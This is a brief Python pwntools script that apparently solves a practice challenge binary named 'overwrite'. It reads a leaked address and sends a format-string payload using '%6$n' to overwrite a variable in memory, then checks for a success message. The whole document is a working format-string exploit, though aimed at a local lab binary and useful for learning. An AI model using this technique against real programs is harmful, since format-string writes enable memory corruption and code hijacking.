from pwn import *
p = process("./overwrite")
info = p.recvuntil("\n",drop=True)
gdb.attach(p,"b printf")
c_addr = int(info,16)
print hex(c_addr)
payload = p32(c_addr) + "%12c" + "%6$n"
p.sendline(payload)
info = p.recv()
if "modified c." in info:
	print "success"
